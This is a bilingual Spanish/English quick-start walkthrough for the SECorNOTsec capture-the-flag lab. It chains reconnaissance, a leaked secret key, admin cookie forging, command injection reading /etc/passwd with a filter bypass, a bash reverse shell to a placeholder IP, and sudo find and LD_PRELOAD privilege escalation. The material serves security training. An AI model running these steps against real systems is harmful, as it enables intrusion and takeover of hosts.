# SECorNOTsec - Quick Start Guide

---

## GUÍA RÁPIDA (Español)

### Resumen Ejecutivo
Este laboratorio requiere la explotación de 6 vulnerabilidades en cadena para obtener acceso root. Tiempo estimado: 20-30 minutos.

### Pasos Críticos

#### **Paso 1: Reconocimiento**
```bash
nmap -p- target_ip
gobuster dir -u http://target_ip:5000 -w wordlist.txt
```
Objetivo: Descubrir puerto 5000 y archivo `env.bak`

#### **Paso 2: Extrae la Secret Key**
- Accede a `http://target_ip:5000/env.bak`
- Obtén la SECRET_KEY del archivo descubierto

#### **Paso 3: Forja Cookie de Admin**
- Obtén la cookie de sesión actual del navegador (DevTools → Storage → Cookies)
- Usa Python para decodificar y crear una nueva cookie con `"is-admin": true`
```python
# Script básico
import base64
import json
cookie_data = {"is-admin": true}
# Codifica con tu SECRET_KEY
```

#### **Paso 4: RCE - Command Injection**
- Accede con la cookie de admin
- En la consola de conectividad, prueba: `& cat /etc/passwd`
- El operador `&` funciona para ejecutar comandos
- Bypass de "bash" usando `b''ash`

#### **Paso 5: Reverse Shell**
```bash
& b''ash -i >& /dev/tcp/<TU_IP>/<PUERTO> 0>&1
```

#### **Paso 6: Escalada a Chocolate**
```bash
sudo -l  # Ver permisos
sudo -u chocolate find . -exec /bin/bash \;
```

#### **Paso 7: Root via LD_PRELOAD**
```bash
sudo -l  # Ver binario con SETENV permitido
# Crear librería maliciosa con LD_PRELOAD
# Compilar y ejecutar con el binario
```

### Puntos Clave
- ✓ env.bak expone la secret key
- ✓ Cookie forging permite acceso de admin
- ✓ WAF tiene maleza: `&` funciona
- ✓ `find` permite ejecución de comandos
- ✓ SETENV + LD_PRELOAD = root

---

## QUICK START GUIDE (English)

### Executive Summary
This laboratory requires exploitation of 6 chained vulnerabilities to obtain root access. Estimated time: 20-30 minutes.

### Critical Steps

#### **Step 1: Reconnaissance**
```bash
nmap -p- target_ip
gobuster dir -u http://target_ip:5000 -w wordlist.txt
```
Objective: Discover port 5000 and `env.bak` file

#### **Step 2: Extract the Secret Key**
- Access `http://target_ip:5000/env.bak`
- Obtain the SECRET_KEY from the discovered file

#### **Step 3: Forge Admin Cookie**
- Obtain the current session cookie from browser (DevTools → Storage → Cookies)
- Use Python to decode and create a new cookie with `"is-admin": true`
```python
# Basic script
import base64
import json
cookie_data = {"is-admin": true}
# Encode with your SECRET_KEY
```

#### **Step 4: RCE - Command Injection**
- Access with admin cookie
- In connectivity console, test: `& cat /etc/passwd`
- The `&` operator works for executing commands
- "bash" bypass using `b''ash`

#### **Step 5: Reverse Shell**
```bash
& b''ash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
```

#### **Step 6: Escalation to Chocolate User**
```bash
sudo -l  # Check permissions
sudo -u chocolate find . -exec /bin/bash \;
```

#### **Step 7: Root via LD_PRELOAD**
```bash
sudo -l  # Check binary with SETENV enabled
# Create malicious library with LD_PRELOAD
# Compile and execute with the binary
```

### Key Points
- ✓ env.bak exposes secret key
- ✓ Cookie forging enables admin access
- ✓ WAF has gaps: `&` works
- ✓ `find` allows command execution
- ✓ SETENV + LD_PRELOAD = root

---

**Nota / Note:** Para detalles técnicos completos, consulta (For complete technical details, see) [SECorNOTsec.md](SECorNOTsec.md) o [SECorNOTsecEn.md](SECorNOTsecEn.md)
